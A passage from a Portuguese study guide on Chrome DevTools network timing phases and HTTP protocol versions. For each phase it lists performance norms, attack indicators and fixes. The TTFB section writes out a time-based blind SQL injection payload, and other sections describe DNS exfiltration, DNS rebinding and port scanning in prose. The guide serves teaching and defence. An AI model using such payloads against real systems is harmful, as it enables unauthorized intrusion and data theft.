| **Request sent** | *Request/Response* | Rede local / Buffer de envio | Respostas vindas do cache local |
| **Waiting for server response (TTFB)** | *Request/Response* | Rede (ida e volta) + Processamento no Servidor | Respostas servidas do cache local sem rede |
| **Content Download** | *Request/Response* | Rede (largura de banda) + Leitura do corpo | Respostas sem corpo (`204`, `304`, `HEAD`) |

A seguir, cada fase é analisada individualmente no padrão completo de 10 pontos.

##### Queueing

- **Nome do parâmetro**: `Queueing` (Enfileiramento / Agendamento do Recurso).
- **O que significa**: tempo em que a requisição permaneceu na fila de agendamento interno do navegador antes mesmo de tentar obter uma conexão de rede. O navegador coloca uma requisição em *Queueing* pelos seguintes motivos principais:
  1. Existem requisições de **maior prioridade** (`Highest` / `High`, como HTML, CSS crítico e fontes) sendo processadas primeiro;
  2. Em **HTTP/1.1**, já existem **6 conexões TCP abertas para aquela mesma origem** (limite histórico imposto pelo Chrome por tupla `esquema + host + porta`), obrigando a 7ª requisição a esperar uma das 6 conexões terminar;
  3. O navegador está alocando brevemente espaço no cache em disco ou aguardando liberação da thread principal/IPC.
- **Para que serve**: revelar gargalos causados por excesso de requisições simultâneas em HTTP/1.1, problemas de priorização de recursos ou bloqueio do navegador antes do envio à rede.
- **Onde encontrar no DevTools**: painel **Network** → clique na requisição → aba **Timing** → seção **Resource Scheduling** → linha **Queueing** (também visível como o trecho inicial branco/cinza-claro da barra no **Waterfall**).
- **Exemplo prático**: uma página carrega 40 imagens de produtos de `http://antigo.loja-ficticia.test` usando `http/1.1`. As 6 primeiras imagens têm `Queueing: 1.5 ms`, mas a 30ª imagem apresenta `Queueing: 840.00 ms` porque teve de esperar quatro rodadas de conexões TCP liberarem vaga.
- **Comportamento normal**: valores baixos (geralmente entre `0.5 ms` e `10 ms`) em sites que utilizam **HTTP/2 (`h2`)** ou **HTTP/3 (`h3`)**, nos quais dezenas de requisições são multiplexadas em uma única conexão sem sofrer o limite de 6 sockets do HTTP/1.1.
- **O que seria considerado seguro**: uso de HTTP/2 ou HTTP/3 sobre TLS para evitar que um grande volume de ativos legítimos ou um script malicioso sature a fila de conexões do cliente **[RECOMENDAÇÃO]**.
- **O que poderia indicar uma vulnerabilidade**:
  - **Negação de Serviço no Cliente (*Client-Side DoS* / *Connection Pool Exhaustion*)**: um script injetado ou mal configurado dispara dezenas de requisições de longa duração (*long-polling* ou downloads lentos) em `http/1.1` para a mesma origem, ocupando todas as 6 conexões disponíveis e travando completamente as chamadas legítimas de login ou API da aplicação (`Queueing` infinito);
  - **XS-Leaks (*Cross-Site Leaks* baseados em Pool de Conexões)**: pesquisas avançadas demonstraram que o esgotamento do pool global de sockets em HTTP/1.1 pode ser medido via tempo de `Queueing` para inferir quantas sub-requisições outra página abriu.
- **Como investigar o problema**:
  1. Ative a coluna **Protocol** e a coluna **Connection ID** na tabela do Network;
  2. Ordene ou observe a coluna **Waterfall**: se você vir "degraus" de 6 em 6 barras com longas faixas de `Queueing`, verifique se o protocolo é `http/1.1`;
  3. Confira a coluna **Priority** para ver se uma chamada crítica de API foi agendada com prioridade baixa devido a sobrecarga de outros recursos.
- **Como corrigir ou prevenir**: migrar o servidor/CDN para **HTTP/2 (`h2`)** ou **HTTP/3 (`h3`)** **[RECOMENDAÇÃO]**; limitar o número de requisições paralelas disparadas por loops JavaScript no front-end e usar paginação ou *lazy loading* (`loading="lazy"`) para imagens **[BOA PRÁTICA]**.

##### Stalled

- **Nome do parâmetro**: `Stalled` (Paralisada / Aguardando Liberação de Conexão).
- **O que significa**: tempo gasto entre o momento em que a requisição sai da fila de agendamento (*Queueing*) e o instante em que ela realmente consegue iniciar a resolução de DNS, abrir conexão ou enviar os bytes. Engloba os mesmos fatores que podem reter o início da conexão (espera por liberação de socket, negociação com proxy configurado no sistema operacional ou verificação de bloqueio de acesso exclusivo ao cache HTTP).
- **Para que serve**: identificar se há atraso na camada de gerenciamento de conexões do navegador, em scripts PAC (*Proxy Auto-Configuration*) corporativos ou em contenção de cache.
- **Onde encontrar no DevTools**: painel **Network** → clique na requisição → aba **Timing** → seção **Connection Start** → linha **Stalled**.
- **Exemplo prático**: duas requisições idênticas `GET /api/config` são disparadas ao mesmo tempo pelo React (por exemplo, em dois componentes que montam juntos). A segunda requisição mostra `Stalled: 95 ms` porque o Chrome percebe que já há uma requisição idêntica cacheável em trânsito e aguarda a primeira terminar para reaproveitar o cache (*cache lock*).
- **Comportamento normal**: valores inferiores a `1–5 ms` na maioria das requisições.
- **O que seria considerado seguro**: tempos de `Stalled` mínimos, sem interferência de proxies desconhecidos e sem disparos duplicados desnecessários no cliente **[BOA PRÁTICA]**.
- **O que poderia indicar uma vulnerabilidade**:
  - Se todas as requisições da máquina passam a exibir tempos anômalos de `Stalled` acompanhados de mudança no `Remote Address`, pode haver um **proxy local ou extensão interceptadora** inspecionando ou atrasando o tráfego;
  - Em aplicações mal projetadas, um loop infinito de `fetch()` (causado por bug em `useEffect` ou payload malicioso) gera centenas de requisições em paralelo, elevando drasticamente `Queueing` e `Stalled` e degradando a disponibilidade.
- **Como investigar o problema**: abra `chrome://net-internals/#proxy` (ou verifique as configurações de proxy do sistema) e compare o comportamento em uma janela anônima sem extensões; verifique na aba **Initiator** se o código front-end está disparando requisições duplicadas simultâneas para a mesma URL.
- **Como corrigir ou prevenir**: deduplicar chamadas de API idênticas no front-end (usando caches de estado como TanStack Query / SWR ou *AbortController*) **[BOA PRÁTICA]**; utilizar HTTP/2 ou HTTP/3 **[RECOMENDAÇÃO]**.

##### DNS Lookup

- **Nome do parâmetro**: `DNS Lookup` (Resolução de Nome de Domínio — DNS).
- **O que significa**: tempo que o navegador levou para resolver o nome de domínio da URL (ex.: `api.loja-ficticia.test`) em um endereço IP (`198.51.100.42` ou `2001:db8::42`), consultando o cache do sistema operacional ou o servidor DNS recursivo configurado (via UDP/53, TCP/53 ou DoH — *DNS over HTTPS*, RFC 8484).
- **Para que serve**: medir a latência da resolução de nomes para cada novo domínio contatado pela página.
- **Onde encontrar no DevTools**: painel **Network** → clique na requisição → aba **Timing** → seção **Connection Start** → linha **DNS Lookup**.
- **Exemplo prático**: a primeira requisição para `https://pagamentos.parceiro-externo.test/sdk.js` exibe `DNS Lookup: 34.20 ms`. A requisição seguinte para o mesmo domínio não exibe a barra `DNS Lookup` (ou exibe `0 ms`), pois o resultado já está em cache e a conexão foi mantida aberta.
- **Comportamento normal**: aparece apenas no primeiro contato com cada domínio distinto (quando não está em cache local), durando tipicamente entre `1 ms` (cache local/rede local) e `50 ms` (consulta recursiva externa).
- **O que seria considerado seguro**:
  - Número reduzido e controlado de domínios externos contatados pela página **[BOA PRÁTICA]**;
  - Resolução de DNS apontando para os endereços IP legítimos esperados da infraestrutura **[REQUISITO]**;
  - Uso de **DNSSEC** (RFC 4033–4035) no domínio e resolvedores com **DoH/DoT** (*DNS over HTTPS / DNS over TLS*) **[RECOMENDAÇÃO]**.
- **O que poderia indicar uma vulnerabilidade**:
  - **Subdomain Takeover (Tomada de Subdomínio)**: uma requisição para `https://promo.loja-ficticia.test/banner.js` resolve via CNAME para um serviço de nuvem desativado (GitHub Pages, S3, Azure) que um atacante reivindicou;
  - **DNS Rebinding**: um domínio malicioso configurado com TTL (*Time to Live*) igual a `0` força uma nova fase de `DNS Lookup` a cada poucos segundos, respondendo primeiro com o IP do próprio atacante e depois com `127.0.0.1` ou `192.168.1.1` para tentar ler serviços da rede interna da vítima;
  - **Exfiltração via DNS / Domínios gerados dinamicamente**: requisições para subdomínios estranhos como `a8f9d0c1.coletor-malicioso.test` nas quais cada requisição força um novo `DNS Lookup` único para transmitir dados codificados no próprio nome do subdomínio.
- **Como investigar o problema**:
  1. Ative a coluna **Domain** e a coluna **Remote Address** na tabela do Network;
  2. Verifique na aba **Timing** quais requisições apresentam `DNS Lookup` e confira para qual IP elas resolveram;
  3. Use `nslookup` ou `dig` no terminal para inspecionar a cadeia de registros `A`, `AAAA` e `CNAME` e o valor do `TTL`.
- **Como corrigir ou prevenir**: remover registros DNS (`CNAME`, `A`) órfãos que apontam para serviços externos desprovisionados (prevenindo *Subdomain Takeover*) **[REQUISITO]**; restringir domínios permitidos via `Content-Security-Policy` **[RECOMENDAÇÃO]**; usar `<link rel="dns-prefetch" href="https://api.exemplo.test">` ou `<link rel="preconnect">` para domínios legítimos críticos a fim de melhorar a performance **[BOA PRÁTICA]**.

##### Initial Connection

- **Nome do parâmetro**: `Initial connection` (Conexão Inicial / Handshake de Transporte).
- **O que significa**: tempo gasto pelo navegador para estabelecer a conexão de camada de transporte com o endereço IP do servidor antes de enviar a requisição HTTP.
  - Em **HTTP/1.1 e HTTP/2** (sobre TCP — RFC 9293), corresponde ao tempo do **Three-Way Handshake TCP** (`SYN` enviado pelo cliente → `SYN-ACK` recebido do servidor → `ACK` enviado pelo cliente, consumindo 1 RTT — *Round-Trip Time*, tempo de ida e volta);
  - Em **HTTP/3** (sobre QUIC/UDP — RFC 9000), o estabelecimento de conexão e a negociação criptográfica TLS 1.3 ocorrem de forma integrada (1-RTT ou 0-RTT).
- **Para que serve**: medir a latência física de rede (RTT) até o servidor ou ponto de presença (PoP) da CDN e identificar quando novas conexões de transporte estão sendo abertas.
- **Onde encontrar no DevTools**: painel **Network** → clique na requisição → aba **Timing** → seção **Connection Start** → linha **Initial connection**.
- **Exemplo prático**:
  - Servidor na mesma cidade (São Paulo → São Paulo): `Initial connection: 8.40 ms`;
  - Servidor em outro continente sem CDN (São Paulo → Frankfurt): `Initial connection: 195.00 ms`.
- **Comportamento normal**: aparece apenas na **primeira requisição** de cada conexão TCP/QUIC (identificada por um novo número na coluna **Connection ID**). Nas demais requisições que reutilizam a mesma conexão (`Keep-Alive` em HTTP/1.1 ou multiplexação em HTTP/2 e HTTP/3), essa fase não aparece.
- **O que seria considerado seguro**: reutilização eficiente de conexões (`Connection: keep-alive` ou HTTP/2 e HTTP/3) e uso de CDN ou balanceadores próximos com proteção anti-DDoS na camada de transporte (`SYN Cookies`, limites de taxa de conexão por IP) **[RECOMENDAÇÃO]**.
- **O que poderia indicar uma vulnerabilidade**:
  - **Servidor fechando a conexão a cada requisição** (`Connection: close` mal configurado), forçando cada uma das dezenas de requisições da página a executar novamente `Initial connection` + `SSL`, o que multiplica o consumo de CPU/sockets no servidor e facilita ataques de **Exaustão de Conexões / DoS**;
  - Tempo de `Initial connection` extremamente alto ou intermitente com falhas `(failed) net::ERR_CONNECTION_TIMED_OUT`, indicando saturação de fila de `SYN` (*SYN Flood*) ou bloqueio de firewall;
  - **Port Scanning Cross-Origin via navegador**: um script malicioso tenta abrir conexões para `http://127.0.0.1:8080`, `:3306`, `:6379` e mede a duração de `Initial connection` (diferenciando entre `RST` imediato de porta fechada e *timeout* de porta filtrada ou conexão aberta).
- **Como investigar o problema**:
  1. Ative a coluna **Connection ID** na tabela do Network;
  2. Verifique se requisições sucessivas para o mesmo domínio compartilham o mesmo **Connection ID** (correto) ou se cada requisição recebe um **Connection ID** novo e exibe barra de `Initial connection` na aba **Timing** (incorreto).
- **Como corrigir ou prevenir**: habilitar `keepalive` no servidor web/proxy reverso e usar HTTP/2 ou HTTP/3 **[RECOMENDAÇÃO]**; implementar as especificações de proteção contra acesso a redes locais (*Private Network Access*) e bloquear portas internas no firewall **[REQUISITO]**.

##### SSL

- **Nome do parâmetro**: `SSL` (Negociação Criptográfica TLS / *TLS Handshake*).
- **O que significa**: tempo gasto na realização do **handshake criptográfico TLS** (*Transport Layer Security* — hoje TLS 1.2 ou TLS 1.3, RFC 8446; o DevTools mantém o rótulo histórico `SSL` por tradição da indústria, embora o protocolo SSL 2.0/3.0 esteja obsoleto e proibido pela RFC 7568). Nessa etapa, cliente e servidor negociam a versão do protocolo e a suíte de cifras (*cipher suite*), o servidor apresenta seu certificado digital X.509, o navegador valida a cadeia de certificação e a revogação, e ambos derivam as chaves simétricas de sessão via troca efêmera de chaves Diffie-Hellman em curvas elípticas (**ECDHE**).
  - Nota técnica: no DevTools, o intervalo reportado em `Initial connection` frequentemente engloba o tempo total de estabelecimento da conexão (TCP + TLS) ou aparece imediatamente acompanhado da sub-barra `SSL` que destaca especificamente a parcela gasta no handshake TLS **[Varia por versão]**.
- **Para que serve**: confirmar que a conexão passou por negociação criptográfica TLS e medir o custo de latência dessa negociação.
- **Onde encontrar no DevTools**: painel **Network** → clique na requisição `https://` ou `wss://` (na primeira requisição da conexão) → aba **Timing** → seção **Connection Start** → linha **SSL**. Para ver os detalhes criptográficos exatos (versão TLS 1.3, cifra `TLS_AES_128_GCM_SHA256`, certificado e SAN — *Subject Alternative Name*), abra a aba **Security** do DevTools.
- **Exemplo prático**:
  - Conexão nova usando **TLS 1.3** (handshake de 1-RTT): `SSL: 14.20 ms`;
  - Conexão nova usando **TLS 1.2** sem retomada de sessão (handshake de 2-RTT): `SSL: 36.80 ms`.
- **Comportamento normal**: aparece na abertura da primeira conexão HTTPS para cada domínio; não aparece nas requisições seguintes que reaproveitam o mesmo túnel TLS.
- **O que seria considerado seguro**:
  - Presença de TLS em **todas** as origens contatadas pela aplicação **[REQUISITO]**;
  - Uso de **TLS 1.3** (RFC 8446) ou **TLS 1.2** com suítes AEAD (*Authenticated Encryption with Associated Data*, como `AES-GCM` ou `ChaCha20-Poly1305`) e *Forward Secrecy* (`ECDHE`) **[REQUISITO]**;
  - *OCSP Stapling* habilitado no servidor para evitar que o navegador precise fazer consultas externas lentas de revogação de certificado durante a fase `SSL` **[RECOMENDAÇÃO]**.
- **O que poderia indicar uma vulnerabilidade**:
  - **Ausência total da fase `SSL` na primeira requisição de uma nova conexão**, acompanhada de `Scheme: http` — significa que toda a comunicação trafega em texto claro sem criptografia;
  - Falha na fase `SSL` com erro `net::ERR_CERT_DATE_INVALID`, `net::ERR_CERT_AUTHORITY_INVALID` ou `net::ERR_SSL_VERSION_OR_CIPHER_MISMATCH`, indicando certificado expirado, autoassinado em produção, tentativa de interceptação *Man-in-the-Middle* (MitM) ou servidor usando versões obsoletas (TLS 1.0/1.1, desativadas nos navegadores modernos conforme RFC 8996).
- **Como investigar o problema**:
  1. Verifique a fase `SSL` na aba **Timing** da primeira requisição de cada domínio;
  2. Abra o painel **Security** do DevTools (se não estiver visível, abra via **More tools** → **Security**) para inspecionar a versão exata do TLS, a cifra negociada e a árvore de origens seguras e não seguras da página.
- **Como corrigir ou prevenir**: habilitar **TLS 1.3** e **TLS 1.2** no servidor, desativando completamente SSLv2, SSLv3, TLS 1.0 e TLS 1.1 **[REQUISITO]**; ativar *OCSP Stapling* e *TLS Session Resumption* (com rotação segura de chaves de ticket) **[RECOMENDAÇÃO]**; automatizar a renovação de certificados X.509 (ex.: via ACME / Let's Encrypt) **[BOA PRÁTICA]**.

##### Request Sent

- **Nome do parâmetro**: `Request sent` (Envio da Requisição).
- **O que significa**: tempo gasto pelo navegador para escrever os bytes da requisição HTTP (linha de requisição/pseudo-headers, cabeçalhos e corpo) no socket de rede local.
- **Para que serve**: medir quanto tempo durou a transmissão dos dados de saída (upload) do cliente para a rede.
- **Onde encontrar no DevTools**: painel **Network** → clique na requisição → aba **Timing** → seção **Request/Response** → linha **Request sent**.
- **Exemplo prático**:
  - Em um `GET /api/produtos` comum (apenas cabeçalhos comprimidos com HPACK/QPACK): `Request sent: 0.18 ms`;
  - Em um `POST /api/videos/upload` enviando um arquivo de `25 MB`: `Request sent: 4210.00 ms` (4,21 segundos).
- **Comportamento normal**: frações de milissegundo (`< 1 ms`) para requisições de leitura ou payloads JSON pequenos; proporcional ao tamanho do arquivo e à taxa de upload da rede apenas em uploads de mídia/arquivos.
- **O que seria considerado seguro**: requisições leves (cookies enxutos e payloads sem dados redundantes) e limites rígidos de tamanho máximo de upload no servidor **[REQUISITO]**.
- **O que poderia indicar uma vulnerabilidade**:
  - **Cookie Bombing / Bloat de Cabeçalhos**: uma requisição simples `GET` apresentando dezenas de kilobytes de cabeçalhos enviados (por exemplo, dezenas de cookies acumulados por subdomínios), elevando o tempo de envio e podendo fazer o servidor rejeitar todas as requisições do usuário com `431 Request Header Fields Too Large` ou `400 Bad Request` (negação de serviço persistente via cookies);
  - **Exfiltração de Dados em Larga Escala**: uma requisição `POST` para domínio externo com tempo elevado de `Request sent` e grande volume de dados enviados a partir do cliente;
  - Upload de arquivos gigantescos sem restrição no cliente nem no servidor, visando esgotar disco ou memória do back-end (ausência de limite `client_max_body_size` → erro `413 Content Too Large`).
- **Como investigar o problema**: se `Request sent` estiver alto em uma requisição que não deveria ser um upload, verifique na aba **Headers** o tamanho do cabeçalho `Cookie` e na aba **Payload** o tamanho do corpo enviado.
- **Como corrigir ou prevenir**: manter cookies pequenos e usar prefixo `__Host-` para impedir que subdomínios injetem cookies extras (*Cookie Tossing*) **[RECOMENDAÇÃO]**; configurar limite máximo de corpo de requisição no proxy reverso (ex.: `client_max_body_size 10M;` no Nginx) e validar o tamanho no cliente antes do upload **[REQUISITO]**.

##### Waiting for server response (TTFB — Time To First Byte)

- **Nome do parâmetro**: `Waiting for server response` — popularmente conhecido como **TTFB** (*Time To First Byte* — Tempo até o Primeiro Byte).
- **O que significa**: tempo decorrido entre o instante em que o navegador terminou de enviar a requisição (`Request sent`) e o instante em que recebeu o **primeiro byte da resposta HTTP** vinda do servidor. Esse intervalo soma três componentes:
  1. O tempo de trânsito na rede para a requisição chegar ao servidor (meio RTT);
  2. **Todo o tempo de processamento no servidor** (autenticação, execução da lógica de negócio no back-end, consultas ao banco de dados SQL/NoSQL, chamadas a microsserviços internos, renderização de template/JSON);
  3. O tempo de trânsito na rede para o primeiro pacote da resposta voltar ao navegador (meio RTT).
  - Nota: na métrica Web Vitals de navegação geral (*Navigation Timing*), o conceito amplo de TTFB do documento às vezes é medido desde o início da navegação (incluindo DNS, conexão e TLS), mas **dentro da aba Timing do Chrome DevTools**, a barra **Waiting for server response** isola especificamente a espera pelo servidor após o envio da requisição (correspondendo à barra **verde** clássica do Waterfall).
- **Para que serve**: é o principal indicador de **desempenho do back-end e do banco de dados** (além da latência de rede de ida e volta). Se o TTFB é alto enquanto `DNS`, `Initial connection` e `Content Download` são baixos, o gargalo está **no servidor** (consulta SQL sem índice, bloqueio de banco, CPU saturada ou chamada externa síncrona lenta).
- **Onde encontrar no DevTools**: painel **Network** → clique na requisição → aba **Timing** → seção **Request/Response** → linha **Waiting for server response** (barra verde no **Waterfall**).
- **Exemplo prático**:
  - Resposta servida por cache na borda da CDN: `Waiting for server response: 12.40 ms`;
  - Endpoint `/api/relatorio-anual` fazendo *full table scan* no banco de dados sem índice: `Waiting for server response: 4850.00 ms`.
- **Comportamento normal**: abaixo de `100–200 ms` para APIs bem otimizadas e páginas dinâmicas; alguns poucos milissegundos para ativos estáticos em CDN.
- **O que seria considerado seguro**:
  - Tempo de resposta previsível e limitado por *timeouts* no servidor e no banco de dados **[RECOMENDAÇÃO]**;
  - **TTFB uniforme** em endpoints sensíveis à enumeração (como `/api/login` e `/api/recuperar-senha`), independentemente de o usuário existir ou não no cadastro **[RECOMENDAÇÃO]**.
- **O que poderia indicar uma vulnerabilidade**:
  1. **Timing Attack / Enumeração de Usuários**: em `/api/login`, um e-mail inexistente responde com `Waiting for server response: 6 ms` (apenas um `SELECT` rápido que retorna vazio), enquanto um e-mail existente com senha errada responde com `Waiting for server response: 320 ms` (porque executou o algoritmo de hashing `bcrypt`/`Argon2id`). Um atacante automatiza a medição do TTFB para descobrir quais e-mails possuem conta no sistema;
  2. **Time-Based Blind SQL Injection (Injeção SQL Cega Baseada em Tempo)**: quando a aplicação não exibe erros de SQL na tela, o teste de segurança em laboratório autorizado injeta funções de atraso condicional (como `' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--`). Um salto exato de `5000 ms` em `Waiting for server response` confirma a vulnerabilidade;
  3. **ReDoS (*Regular Expression Denial of Service*) ou DoS Algorítmico**: o envio de uma string curta especialmente construída trava a CPU do servidor em uma expressão regular com *backtracking* catastrófico, fazendo o TTFB disparar para dezenas de segundos até dar `504 Gateway Timeout`;
  4. **SSRF (*Server-Side Request Forgery*)**: o servidor faz uma requisição HTTP interna síncrona para um IP informado pelo usuário, e a diferença no TTFB revela se o host/porta interna na rede privada do servidor está ativo ou inacessível.
- **Como investigar o problema**:
  1. Passe o mouse sobre a barra na coluna **Waterfall** ou abra a aba **Timing** e observe `Waiting for server response`;
  2. Verifique se o servidor enviou o cabeçalho `Server-Timing` (exibido na parte inferior da aba **Timing**), que detalha exatamente quantos milissegundos foram gastos no banco de dados vs. código de aplicação;
  3. Em testes de segurança em laboratório autorizado, compare o TTFB de uma requisição com e-mail cadastrado versus e-mail não cadastrado (fazendo múltiplas medições para descartar jitter de rede).
- **Como corrigir ou prevenir**:
  - Otimizar consultas com índices, paginação e cache no servidor **[BOA PRÁTICA]**;
  - Igualar o tempo de processamento em rotas de login executando uma verificação de hash fictícia (*dummy hash verification*) quando o usuário não existe **[RECOMENDAÇÃO]**;
  - Usar *Prepared Statements* (consultas parametrizadas) para eliminar SQL Injection **[REQUISITO]**;
  - Definir *timeouts* estritos em consultas de banco de dados, expressões regulares e chamadas HTTP de saída no servidor **[RECOMENDAÇÃO]**.

> [!TIP]
> **Questão clássica de prova:** O que significa **TTFB (*Time To First Byte*)** e o que um TTFB muito alto com *Content Download* baixo indica?
> Significa o tempo que o navegador aguarda até receber o primeiro byte da resposta do servidor. Quando o TTFB é alto (ex.: `3,5 s`) e o *Content Download* é baixo (ex.: `2 ms`), o problema **não é o tamanho do arquivo nem a velocidade de download da internet do usuário**, mas sim a **demora do servidor para processar a requisição e começar a responder** (ou alta latência de rota até o servidor).

##### Content Download

- **Nome do parâmetro**: `Content Download` (Download do Conteúdo / Recebimento do Corpo).
- **O que significa**: tempo gasto pelo navegador para ler todos os bytes do corpo da resposta HTTP, desde o recebimento do primeiro byte (fim do TTFB) até o recebimento do último byte.
- **Para que serve**: avaliar se a lentidão de uma requisição decorre do **volume de dados transferidos** (bundle JavaScript gigante, imagem sem compressão, JSON com dezenas de milhares de registros sem paginação) ou de limitação na largura de banda de download.
- **Onde encontrar no DevTools**: painel **Network** → clique na requisição → aba **Timing** → seção **Request/Response** → linha **Content Download** (barra **azul** no **Waterfall**).
- **Exemplo prático**:
  - Resposta JSON paginada com 20 itens (`4 KB` comprimido com Brotli): `Content Download: 1.10 ms`;
  - Resposta JSON sem paginação retornando todos os 50.000 clientes da tabela (`18 MB`): `Content Download: 3650.00 ms`.
- **Comportamento normal**: poucos milissegundos para respostas de API e textos comprimidos (`gzip`, `br`, `zstd`); maior apenas para vídeos, imagens de alta resolução ou grandes pacotes iniciais.
- **O que seria considerado seguro**: respostas de API com paginação obrigatória (`limit` máximo imposto no servidor) e compressão HTTP adequada para ativos públicos **[RECOMENDAÇÃO]**.
- **O que poderia indicar uma vulnerabilidade**:
  - **Lack of Resources & Rate Limiting / Falta de Paginação (OWASP API4)**: um endpoint `GET /api/usuarios?limit=999999` aceita qualquer limite e despeja o banco inteiro em uma única resposta, apresentando enorme barra de `Content Download` e grande `Size`, permitindo raspagem completa de dados (*data scraping*) e exaustão de memória no servidor;
  - **Excessive Data Exposure**: um endpoint que deveria retornar apenas um resumo simples baixa megabytes de registros detalhados ocultos no JSON.
- **Como investigar o problema**: ordene a tabela do Network clicando na coluna **Size** (do maior para o menor) ou use o filtro `larger-than:1M` (maiores que 1 Megabyte); clique nas maiores respostas e compare **Waiting for server response** com **Content Download** na aba **Timing**, verificando também se o cabeçalho de resposta `Content-Encoding: br` (ou `gzip`) está presente.
- **Como corrigir ou prevenir**: impor paginação no servidor com teto máximo intransponível (ex.: máximo de 100 registros por página, mesmo que o cliente peça `?limit=100000`) **[REQUISITO]**; habilitar compressão `br` (Brotli) ou `gzip` para respostas textuais públicas **[BOA PRÁTICA]**. (Nota: evite comprimir respostas HTTPS que misturem segredos de sessão/CSRF no corpo junto com entrada refletida do atacante em contextos vulneráveis a ataques de canal lateral de compressão como BREACH).

##### Fases de Service Worker (ServiceWorker Preparation / Request to ServiceWorker)

- **Nome do parâmetro**: `ServiceWorker Preparation` (Preparação do Service Worker), `Request to ServiceWorker` (Requisição enviada ao Service Worker) e `Receiving Push` **[Varia por versão]**.
- **O que significa**: fases adicionais que aparecem na aba **Timing** exclusivamente quando a página é controlada por um **Service Worker** ativo (um script JavaScript que roda em segundo plano no navegador como um proxy programável entre a página web, o cache e a rede):
  - **ServiceWorker Preparation**: tempo gasto pelo navegador para iniciar (*spin up*) a thread do Service Worker caso ela estivesse ociosa/suspensa no momento da requisição;
  - **Request to ServiceWorker**: tempo que o evento `fetch` levou sendo processado dentro do código do Service Worker (seja consultando o `Cache Storage` local, seja buscando o recurso na rede com `fetch(event.request)`).
- **Para que serve**: medir a sobrecarga introduzida pelo Service Worker e saber se a resposta veio rapidamente do cache gerenciado pelo Service Worker ou se o próprio Service Worker atrasou o carregamento.
- **Onde encontrar no DevTools**: painel **Network** → clique em uma requisição interceptada por Service Worker (identificada pelo ícone de engrenagem ao lado do nome ou por `(from service worker)` na coluna **Status** / **Size**) → aba **Timing**. Em versões modernas do Chrome, a aba **Timing** exibe inclusive um diagrama/detalhamento de roteamento (*Router Evaluation*, *Cache Lookup*) quando a API *Service Worker Static Routing* é utilizada **[Varia por versão]**.
- **Exemplo prático**:

```text
Connection Start                     DURATION
  Stalled                            0.45 ms
  ServiceWorker Preparation          14.80 ms
Request/Response                     DURATION
  Request to ServiceWorker           6.20 ms
  Content Download                   0.90 ms
```

- **Comportamento normal**: requisições de ativos estáticos do PWA (*Progressive Web App*) são atendidas em poucos milissegundos pelo Service Worker a partir do `Cache Storage`; requisições de API autenticadas passam pelo Service Worker direto para a rede (ou ignoram o cache).
- **O que seria considerado seguro**:
  - Registro de Service Worker permitido exclusivamente em origens HTTPS (exigência nativa dos navegadores, exceto `localhost`) e sem pontos de injeção no script do Service Worker **[REQUISITO]**;
  - O Service Worker **não** armazena em `Cache Storage` respostas autenticadas contendo dados pessoais ou financeiros, ou limpa todo o `Cache Storage` no momento do logout **[REQUISITO]**.
- **O que poderia indicar uma vulnerabilidade**:
  - **Persistência de XSS via Service Worker Comprometido**: se uma aplicação permite o upload de arquivos na mesma origem ou possui um endpoint JSONP/script refletido e um atacante consegue registrar um Service Worker malicioso (ou injetar código via `importScripts`), o Service Worker passa a interceptar **todas** as requisições futuras da vítima naquela origem (`Request to ServiceWorker`), mesmo depois que a vulnerabilidade XSS original na página for corrigida;
  - **Vazamento de Dados em Computadores Compartilhados**: após fazer logout, uma requisição para `/api/meus-dados` responde instantaneamente com `200 OK (from service worker)` e `Request to ServiceWorker: 2 ms` sem ir à rede, entregando os dados privados do usuário anterior para o próximo usuário do navegador.
- **Como investigar o problema**:
  1. Procure requisições com `(from service worker)` na coluna **Size** ou com o ícone de engrenagem na coluna **Name**;
  2. Confira na aba **Timing** as barras `ServiceWorker Preparation` e `Request to ServiceWorker`;
  3. Para testar se o comportamento muda sem o Service Worker, vá até a aba **Application** → **Service Workers** e marque a opção **Bypass for network** (Ignorar para a rede), recarregando a página no painel **Network**.
- **Como corrigir ou prevenir**: nunca cachear endpoints de dados sensíveis/autenticados no `Cache Storage` do Service Worker **[REQUISITO]**; ao executar logout, remover caches sensíveis (`caches.delete(...)`) e enviar o cabeçalho HTTP `Clear-Site-Data: "cache", "cookies", "storage"` **[RECOMENDAÇÃO]**; restringir rigorosamente o caminho e o `Content-Type` de arquivos enviados por usuários para que jamais possam ser registrados como um Service Worker **[REQUISITO]**.


<a id="s2-1-7"></a>
#### 2.1.7 Protocolos HTTP/1.1, HTTP/2 e HTTP/3 no DevTools

O painel **Network** é a principal ferramenta prática para verificar qual versão do protocolo HTTP uma aplicação web está efetivamente utilizando na comunicação entre o navegador e o servidor (ou CDN / proxy reverso), bem como observar na prática o efeito da **multiplexação** sobre o carregamento da página.

##### Identificação dos protocolos na coluna Protocol

Por padrão, a coluna **Protocol** pode estar oculta na tabela de requisições. Para exibi-la, clique com o botão direito sobre o cabeçalho de qualquer coluna da tabela (ex.: `Name`, `Status`) e marque **Protocol** (e aproveite para marcar também **Connection ID**). Os valores principais exibidos são:

| Valor na coluna `Protocol` | Protocolo Oficial e RFC | Transporte Subjacente | Criptografia no Navegador | Compressão de Headers |
|---|---|---|---|---|
| **`http/1.0`** | HTTP/1.0 (RFC 1945) | TCP | Opcional (texto claro ou TLS) | Nenhuma (texto puro) |
| **`http/1.1`** | HTTP/1.1 (RFC 9112) | TCP | Opcional (texto claro na porta 80 ou TLS na 443) | Nenhuma (texto puro) |
| **`h2`** | HTTP/2 (RFC 9113) | TCP | **Obrigatória nos navegadores** (TLS 1.2+ negociado via ALPN) | **HPACK** (RFC 7541) |
| **`h3`** | HTTP/3 (RFC 9114) | **QUIC sobre UDP** (RFC 9000) | **Obrigatória e integrada ao QUIC** (TLS 1.3 nativo) | **QPACK** (RFC 9204) |
| **`blob` / `data`** | Esquemas locais | Memória do navegador | N/A (recurso local) | N/A |

> [!NOTE]
> Por que a primeira visita a um site moderno às vezes aparece como **`h2`** e, ao recarregar a página, muda para **`h3`**?
> Porque na primeira conexão o navegador ainda não sabe se aquele servidor suporta HTTP/3 sobre UDP/QUIC. Ele conecta de forma segura via TCP/TLS usando **`h2`** e o servidor envia na resposta o cabeçalho **`Alt-Svc: h3=":443"; ma=86400`** (*Alternative Services*, RFC 7838) — ou o navegador descobre o suporte via registro DNS **HTTPS / SVCB** (RFC 9460). Nas requisições seguintes, o navegador migra automaticamente para **`h3`**!

##### Multiplexação, Connection ID e impacto visual no Waterfall

A comparação entre `http/1.1`, `h2` e `h3` no DevTools fica cristalina quando combinamos três colunas da tabela: **Protocol**, **Connection ID** e **Waterfall**:

